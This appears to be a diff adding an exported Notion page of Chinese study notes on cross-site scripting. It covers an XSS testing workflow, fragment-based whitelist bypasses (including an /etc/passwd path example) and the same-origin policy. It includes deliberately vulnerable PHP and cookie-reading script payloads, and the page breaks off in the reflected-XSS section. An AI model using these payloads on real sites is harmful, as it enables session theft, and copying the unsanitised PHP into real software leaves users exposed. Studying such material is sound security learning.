@@ -1,0 +1,807 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>XSS</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="62a8db55-6aee-8293-b908-01d1731acfe8" class="page mono"><header><h1 class="page-title" dir="auto">XSS</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><p id="1008db55-6aee-82c4-a9b0-0125d31db7b4" class="">&gt;&gt;&gt; 跨站脚本攻击，应用程序的一种安全漏洞，是代码注入的一种。</p></div><div style="display:contents" dir="auto"><p id="5f38db55-6aee-82f0-bda8-8177d9d9e5bc" class="">通常指利用网站开发时留下的漏洞，巧妙注入恶意指令代码到网页，使用户执行以获得私密内容或得到跟高权限，会话，Cookie等内容。</p></div><div style="display:contents" dir="auto"><p id="1c68db55-6aee-828b-8ea0-81e4fb7c1b31" class="">恶意代码通常是js，实际上可能包含java，VBScript，ActiveX，Flash或普通HTML。</p></div><div style="display:contents" dir="auto"><ul id="fde8db55-6aee-820b-8a32-81f509e24ba7" class="toggle"><li><details open=""><summary>XSS漏洞测试流程</summary><div style="display:contents" dir="auto"><p id="8a98db55-6aee-83e4-8057-01542d37fbce" class="">1、在目标网站上找输入点，查询接口，留言板等</p></div><div style="display:contents" dir="auto"><p id="55c8db55-6aee-820c-b330-0100b81d36ce" class="">2、输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理</p></div><div style="display:contents" dir="auto"><p id="7d58db55-6aee-83e1-bbf3-01914987633e" class="">3、通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造js的条件（构造闭合）。</p></div><div style="display:contents" dir="auto"><p id="b2d8db55-6aee-83b0-9ff5-81955fd0805d" class="">4、提交构造的脚本代码（以及各种绕过姿势），看是否可行，如果可行就存在xss</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="f598db55-6aee-82ba-8564-812e7efa3e5d" class="toggle"><li><details open=""><summary><code>#</code> 的特性 ⚠️</summary><div style="display:contents" dir="auto"><p id="9fc8db55-6aee-8315-9d9a-018b6c4bae72" class="">1、服务器会忽略<code>#</code>后的内容</p></div><div style="display:contents" dir="auto"><p id="6688db55-6aee-821f-9c75-81cd564f7b0e" class="">例如：发送<code><a href="https://example.com/path?param=123#abcdef">https://example.com/path?param=123#abcdef</a></code> 服务器接收到的是<code><a href="https://example.com/path?param=123">https://example.com/path?param=123</a></code> 而<code>#abcdef</code> 仅在浏览器本地处理。</p></div><div style="display:contents" dir="auto"><p id="8588db55-6aee-820d-9726-018afc1c3d30" class="">2、客户端的处理逻辑</p></div><div style="display:contents" dir="auto"><p id="9708db55-6aee-82f6-9822-01e77bb47ffd" class=""><code>#</code> 后的内容（称为<strong>哈希值</strong>）主要用于：页面内导航，单页应用（SPA）中保存状态（如路由信息），不会触发页面重新加载。</p></div><div style="display:contents" dir="auto"><p id="8e48db55-6aee-82d2-bcc7-8140244b1db3" class=""><mark class="highlight-pink"><strong>3、利用</strong></mark><mark class="highlight-pink"><code><strong>#</strong></code></mark><mark class="highlight-pink"><strong> 绕过白名单：</strong></mark></p></div><div style="display:contents" dir="auto"><p id="4818db55-6aee-824e-8c24-01c505ecbceb" class="">假设有一台服务器有一个白名单过滤机制，仅允许访问特定路径（如/safe），而进制访问/admin，此时构造UR：<code><a href="https://example.com/safe#/admin">https://example.com/safe#/admin</a></code> </p></div><div style="display:contents" dir="auto"><p id="e6f8db55-6aee-832d-86f4-01bdab9872cc" class="">此时服务器会认为请求的是/safe，因此允许访问，</p></div><div style="display:contents" dir="auto"><p id="2058db55-6aee-83f4-9f41-81dcdd1343cc" class="">客户端会加载/safe页面，但同时会解析<code>#/admin</code>并在本地处理（即可以对/admin中内容进行操作）</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="ec18db55-6aee-82a1-8433-0195ed4ef7c7" class="toggle"><li><details open=""><summary><code>#</code> 的例子 ⚠️</summary><div style="display:contents" dir="auto"><ol type="1" id="f388db55-6aee-833f-990b-0128a3aa7388" class="numbered-list" start="1"><li><strong>文件包含白名单绕过</strong>若服务器仅允许包含 <code>file=safe.txt</code>，但通过 <code>file=safe.txt#../etc/passwd</code>，服务器会读取 <code>safe.txt</code>，而客户端若有文件解析逻辑（如某些模板引擎），可能误处理 <code>#</code> 后的路径。</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="1b68db55-6aee-83f8-931e-811f2d6e8242" class="numbered-list" start="2"><li><strong>跳转白名单绕过</strong>若服务器限制跳转域名（如仅允许 <code>example.com</code>），构造 <code>https://example.com#evil.com</code>，服务器验证通过，但客户端若有跳转逻辑依赖哈希值，可能跳转到恶意网站。</li></ol></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="7c68db55-6aee-8342-a469-012bab3b1fd6" class="toggle"><li><details open=""><summary>跨域</summary><div style="display:contents" dir="auto"><p id="9578db55-6aee-83f4-acbc-01b13e535912" class="">当协议，主机（主域名，子域名），端口种的任意一个不同时，称为不同域。</p></div><div style="display:contents" dir="auto"><p id="a528db55-6aee-831c-a3f3-01ef466becad" class="">不同域之间的请求数据操作，称为跨域操作。</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-jsx.min.js" integrity="sha512-m3JYEI6gx5fh9jF10FjGoMzVKcV2N6nchcDcqPCdI1L3R2WQV7br2XVNR8iTLb2daOMRl3zldbcfT40xU2ntVw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="26f8db55-6aee-82c3-9e6c-017003c20262" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">http:// www . xyz.com : 8080 / script/test.js
+协议    子域名   主域名   端口      资源地址</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="00a8db55-6aee-8302-98a1-819e9a5da03a" class="toggle"><li><details open=""><summary>跨域-同源策略</summary><div style="display:contents" dir="auto"><p id="75e8db55-6aee-83c9-ae69-81ffcf008b4f" class="">同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如：x.com域名下的javascript并不能操作y.com域下的对象。</p></div><div style="display:contents" dir="auto"><p id="0388db55-6aee-83d2-b601-0102a6f264de" class="">比如：A登录了淘宝，攻击者向A发送一个恶意链接urlb:http://www.盗你cookie.com</p></div><div style="display:contents" dir="auto"><p id="c708db55-6aee-82fe-be4b-0114b4ed4753" class="">在没有同源策略时，urlb上的js就可以操作A的内容</p></div></details></li></ul></div><div style="display:contents" dir="auto"><hr id="0158db55-6aee-830d-9d21-8176bac7c5b4"/></div><div style="display:contents" dir="auto"><hr id="1638db55-6aee-8399-9964-0120c5d707d0"/></div><div style="display:contents" dir="auto"><ul id="9598db55-6aee-8372-923e-01c2ba47c40e" class="toggle"><li><details open=""><summary>存储型XSS（Stored XSS, 持久型 XSS）</summary><div style="display:contents" dir="auto"><p id="7218db55-6aee-8270-a86b-8127fb25e9bf" class="">&gt;&gt;&gt;注入的脚本被服务器<mark class="highlight-brown"><strong>永久存储</strong></mark>（如数据库，文件），每次访问包含该脚本的页面时都会触发。一般利<mark class="highlight-brown"><strong>用评论区，用户资料，留言板</strong></mark>等，在用户解析html时执行。</p></div><div style="display:contents" dir="auto"><p id="5508db55-6aee-831b-b4f8-81c73d05120f" class="">&gt;&gt;&gt; 例如：</p></div><div style="display:contents" dir="auto"><p id="c2a8db55-6aee-821c-ba37-816a4600fee8" class="">问题源码：</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="a0d8db55-6aee-8225-8fb5-812488df4ae2" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+$name=$_GET[&#x27;name&#x27;] ?? &#x27;&#x27;;
+if($name!=&#x27;&#x27;)
+		file_put_contents(&#x27;data.txt&#x27;, $name);
+$name=file_get_contents(&#x27;data.txt&#x27;);
+echo &quot;hello $name&quot;
+?&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="e0b8db55-6aee-83bf-a0f7-8158d6dca616" class="">注入代码：</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" integrity="sha512-sijCOJblSCXYYmXdwvqV0tak8QJW5iy2yLB1wAbbLc3OOIueqymizRFWUS/mwKctnzPKpNdPJV3aK1zlDMJmXQ==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="d708db55-6aee-82fe-8e12-818129925248" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">?name=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+// 更隐蔽的方法
+?name=&lt;img src=x onerror=alert(document.cookie)&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="0dc8db55-6aee-83ff-906f-81b051531872" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="87a8db55-6aee-8302-829b-01f4a2dd0f4e" class="toggle"><li><details open=""><summary>反射型XSS（Reflected XSS, 非持久型 XSS）</summary><div style="display:contents" dir="auto"><p id="70d8db55-6aee-834b-9fcc-01ef9751404e" class="">&gt;&gt;&gt; 恶意脚本通过URL参数，表单提交等方式传递给服务器，服务器未过滤直接将脚本“反射”回页面（嵌入HTML），仅在当前请求中生效，不会被服务器存储。会通过<mark class="highlight-brown"><strong>邮件，聊天工具</strong></mark>等欺骗用户点击URL</p></div><div style="display:contents" dir="auto"><p id="f878db55-6aee-8220-822a-81f5ebc9d040" class="">&gt;&gt;&gt; 代码：</p></div><div style="display:contents" dir="auto"><pre id="6178db55-6aee-8318-b4ff-0101fe2eee06" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">// 后端代码
+$search = $_GET[&#x27;query&#x27;]; // 获取url参数
